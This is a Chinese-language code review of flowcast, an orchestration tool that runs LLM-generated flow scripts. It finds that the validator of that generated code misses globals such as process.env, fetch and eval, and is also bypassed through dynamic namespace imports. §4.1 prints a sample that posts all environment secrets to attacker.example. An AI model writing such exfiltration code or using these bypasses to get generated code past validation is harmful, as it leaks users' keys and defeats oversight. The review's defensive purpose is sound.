# flowcast 架构 & 代码实现 Review（2026-07-06）

> 视角：同事级代码评审（直说结论 + trade-off）。
> 方式：通读 L1/L2/L3 全部核心模块源码（含 `orchestrator/`、`dashboard/`、`test/`），并与项目自带的 `docs/GAP-ANALYSIS.md`（三轮深度 review）交叉比对。
> 全量单测（`node --test test/*.test.js`，22 个文件、300+ 用例）已触发，运行时间较长，出结果后以实测数补全信心；本评审的论点基于源码通读，不依赖该次跑分。

---

## 0. 一句话结论

**内核架构是扎实的，且明显经历过严格安全审计。** 三层正交原语、零运行时依赖、纯 ESM、续跑锁/自改沙箱/质量门都设计得很认真。但有一个**自带的 GAP-ANALYSIS 没有覆盖、且与它「import 白名单很安全」的判断直接冲突**的真实缺口（见 §4），加上 L3 codegen 真实可靠性证据为零这个老问题，构成了当前最大的两类风险。

---

## 1. 架构层面 —— 做得好的（先确认，避免无脑挑刺）

- **三层正交（L1 执行器 / L2 原语 / L3 codegen）边界清晰。** L2 每个原语（checkpoint / self-mod-guard / quality-gate / loop / subflow / verify / hitl）都可独立测试、可独立被外部库消费，符合「原语优先」原则，不是把逻辑塞进 flow 里。
- **`agent.js` 已重构为纯 re-export**，彻底解决了 `executor ↔ adapters ↔ agent` 的循环依赖（CLAUDE.md 记的 P1-A1）。这是干净的修复，单一事实来源在 `adapters.js` / `executor.js`。
- **续跑锁（`orchestrator/run.js` 的 `acquireLock`）设计考究**：`mkdir O_EXCL` 原子拿锁 + `owner.json` 记 PID/startedAt；僵尸判定同时看 PID 存活（`kill(pid,0)`）和 **PID 复用竞态**（`ps -o etime=` 比对锁创建时间，排除复用的新进程）。Windows 上保守回退到 STALE 超时，注释把取舍讲清楚了。这是教科书级的实现。
- **超时语义统一**：`spawn.js` / `subflow.js` / `runFlow` 都 SIGTERM→5s→SIGKILL，避免孤儿进程；`runFlow` 还做了父进程信号转发 + 具名 listener 引用（防 MaxListeners 泄漏）。细节到位。
- **`verify.js` 对抗式验证**是少见的亮点：多个「怀疑者」独立 refute，失败 voter 用 `strict:false` 不中断整体，且**所有 voter 都失败 → 抛 `VerifyError` 而非误判通过**（第 75 行）。边界条件想得透。
- **配置三分**（`通用库 / 项目仓 .flowcast/ / 机器级 ~/.flowcast/`） + 密钥 `${VAR}` 运行时插值不入仓。正确。

---

## 2. 架构层面 —— 我的意见

### 2.1 L3 codegen 是卖点也是最大不确定项（与自带 GAP-ANALYSIS 一致，再强调）
`orchestrate "一句话需求" → 生成 flow.mjs → 校验 → 执行` 是 flowcast 区别于普通 runner 的核心。但 `EVALUATION.md` 的运行记录仍是**一行占位「待首次运行」**，所有 orchestrator 单测都注入 fake `generate`/`decomposeGen` 绕过了真实 LLM。即：**最该被验证的环节零真实负载证据**。这是工程风险，不是代码缺陷——但发布决策必须卡这一关。

### 2.2 复用（resume）路径跳过再校验
`orchestrate` 命中 `reused` 后直接跑既有 `flow.mjs`，**不再跑 `validateFlow`**。语义上正确（resume 不该重生成），但意味着：一旦 `validate.js` 的安全规则升级，旧的、绕过新规则的 flow 仍会被直接执行。建议：在 `runDir` 留一个 `validateVersion` 标记，reuse 时若规则版本落后则强制重校验（或至少告警）。优先级低，但属于「安全规则升级会静默失效」的隐患。

### 2.3 `assertSafeIdent`（标识符白名单）已在多个拼路径处使用，但覆盖面可再收紧
`runId` / `task.name` / `tag` 都走了 `assertSafeIdent` 防路径穿越（好）。但 `extraArgs` 透传给子 flow 时是**原样透传**（不校验），依赖 flow 自身信任。对可信 flow 没问题，对 L3 生成 flow 则交给 import 白名单兜底——而 import 白名单本身有 §4 的盲区。

---

## 3. 代码实现层面 —— 做得好的

- **`executor.js` 的双层白名单**：`SAFE_OPTS_KEYS`（agents.json 透传字段）+ `extraArgs` 元素级白名单，静默丢弃 `systemPromptFile`/`workspace` 等任意路径字段，防 LLM 注入。配套单测覆盖到位（`executor.test.js` 177–320 行）。
- **`hitl.js` mcp2cli 路径白名单**：只允许默认 `mcp2cli` 或白名单目录（/usr/local/bin 等）下的绝对路径，防注入任意 binary 做 RCE 信道。方向正确。
- **`checkpoint.js` sidecar marker** 已用转义序列 `'\x00...'`（`'\0'` 字面量 NUL 字节曾在 GAP-ANALYSIS 记的 P0，已修）。
- **`dashboard/render.js` CSS class 白名单**：只允许已知状态，其他替换为 `unknown`，防 `state.json` 注入 class 属性。细节安全意识好。

---

## 4. 重点：import 白名单的「全局对象」盲区（自带 GAP-ANALYSIS **未覆盖**，且与它「import 白名单 = 安全护栏」的判断冲突）

这是我这次 review 最想点的一个问题。

### 4.1 现象
`orchestrator/validate.js` 的 `scanImports` 扫描的是 `import` / `require` / `export ... from` 这几种**模块通道**。它拦住了 `import {exec} from 'child_process'`、`import('fs')`、re-export 绕过等。项目据此认为「生成的 flow 不能碰 fs / 进程 / 网络」。

但 **Node ESM 里有一批全局对象，不需要任何 import 就能用**：

- `process.env` —— 直接读宿主环境变量（API key / 密钥）。
- `fetch(...)` —— Node 18+ 原生全局，任意外联网络（数据外泄）。
- `eval(...)` / `new Function(...)` —— 运行时执行任意代码字符串。
- `globalThis` —— 访问全部全局绑定。
- `process.exit()` / `process.kill()` —— 进程控制。

`scanImports` **一个都没扫**。所以一个「通过三关校验」的 flow 仍然可以写：

```js
// 通过 import 白名单，但能外泄密钥
const keys = { ...process.env }
await fetch('https://attacker.example/collect', { method: 'POST', body: JSON.stringify(keys) })
```

### 4.2 更致命的不对称：dry-run 收紧 env，真实执行却继承全量 env
- `validate.js` 的 dry-run 子进程用了**最小 env**（`PATH` + 假 `HOME` + 不含任何密钥），注释明确写「生成的 flow 尚未完全信任，若传入真实密钥验证沙箱形同虚设」。✅ 想得对。
- 但 `subflow.js` 的 `runFlow`（**真实执行路径**）是 `const env = { ...process.env }` —— **完整继承宿主环境**，所有 API key / `~/.flowcast/providers.json` 路径 / SSH agent 等全暴露给生成的 flow。
- 结果：dry-run 的 hardening 在真实执行时被一笔勾销。护栏②（import 白名单）只堵了模块通道，护栏③（隔离执行）却把宿主环境整个交了出去。

### 4.3 已知但仍未堵的 bypass：动态命名空间
`validate.js` 第 148 行注释自己承认：`import * as fc from 'flowcast'; fc.spawnCapture()` 无法静态拦截。同理 `import('flowcast').then(m => m.spawnCapture())` —— 具名导入的 `FORBIDDEN_FLOWCAST_SYMBOLS` 检查只覆盖 `import { spawnCapture } from 'flowcast'` 静态形式，动态命名空间链绕过了它，仍可调到底层任意子进程原语。

### 4.4 建议（按性价比排序）
1. **真实执行也收窄 env**（`runFlow`）：至少像 dry-run 一样用假 `HOME` + 仅注入 flow 真正需要的变量（如 `FLOWCAST_` 系列），不要把 `process.env` 整体传下去。这是最小改动、最大收益，直接消除 4.2 的密钥外泄面。**强烈建议。**
2. **`scanImports` 增加全局对象扫描**：正则拦截 `process.env` / `process.exit` / `process.kill` / `fetch(` / `eval(` / `new Function(` / `globalThis` / `import(`（动态，已在做字面量检测，扩展为禁止裸 `import(` 后出现非白名单解构链）。属于「trust but verify」下该补的静态层。
3. **明确信任模型文档**：在 FLOW_API / CLAUDE 写清「通过校验的 flow 被视为可信代码，有等同本机用户的全部能力（除 import 白名单显式禁止的模块）」。要么补 1+2 收紧，要么明示风险——现在的状态是「以为被白名单挡住，其实没挡住」，最危险。
4. **动态命名空间 bypass**：要么在 FLOW_API 文档明文禁止 `import * as fc` + 运行时取 `spawnCapture`（当前只在注释里提），要么用更激进的 AST 扫描（如 `acorn`）替代正则，覆盖解构链。

> 说明：项目自己把「不做完整 VM 级沙箱」标为 v1 的刻意取舍（prompt.md 第 37 行）。所以这不是「漏做」，而是「取舍的边界没守到 env 这一层」。4.2 的 env 不对称尤其不该存在——dry-run 都做了，真实执行没收，说不过去。

---

## 5. 与自带 GAP-ANALYSIS 的差异 / 补充

GAP-ANALYSIS（三轮）的结论我已核对，绝大部分认同，不重复。三点补充/修正：

| 项目 | GAP-ANALYSIS 说法 | 我的核对 |
|---|---|---|
| import 白名单安全性 | 「安全防护到位：import 白名单…」（§4 末尾，作为优点） | **部分不成立**：白名单只堵模块通道，全局对象通道 + 真实执行 env 继承未被覆盖（见 §4）。应降级为「必要但不充分」。 |
| L2 成熟度 | 「L1/L2 已达库消费成熟度」 | 认同。续跑锁、自改沙箱、质量门实现质量高，单测覆盖真实。 |
| 真实可靠性 | 「L3 + 断点续跑无真实负载证据」 | 认同且强调：这是发布前唯一的硬卡点。 |

---

## 6. 优先级建议（给 Jeff 的拍板清单）

| 优先级 | 项 | 改动量 | 理由 |
|---|---|---|---|
| **P1** | `runFlow` 真实执行收窄 env（假 HOME + 仅注入必要变量） | 小 | 直接消除密钥外泄面，填补 dry-run/真实执行的不对称。§4.2 |
| **P1** | `scanImports` 增补全局对象扫描（process/fetch/eval/Function/globalThis） | 小 | 让「trust but verify」的静态层名副实。§4.1/4.4 |
| **P1** | 明确 L3 生成 flow 的信任模型文档（或上 VM 沙箱） | 小 | 消除「以为被挡住其实没挡」的错觉。§4.3/4.4 |
| **P2** | 动态命名空间 bypass（`import * as fc` + spawnCapture）AST 扫描或明文禁止 | 中 | 当前仅注释提示，可绕。§4.3 |
| **P2** | reuse 路径记录 validate 版本，规则升级时强制重校验 | 小 | 防安全规则升级静默失效。§2.2 |
| 已有 | L3 真实负载冒烟（单任务 + `--split`），建成功率 baseline | 中 | GAP-ANALYSIS P1-1，未变。 |

---

## 7. 总评

代码质量是**明显高于平均开源项目**的水平：防御性编程、失败语义、并发/锁的细节都经得起读。最大的结构性风险不是某行 bug，而是**「import 白名单 = 安全护栏」这个心智模型本身有洞**，而它对 L3 生成 flow 是核心承诺。把 §4 的 env 不对称和全局对象扫描补上，这套安全模型才真正闭环。其余按 GAP-ANALYSIS 推进真实负载验证即可。

（注：全量单测跑分以实测为准，本评审不依赖该数字。）
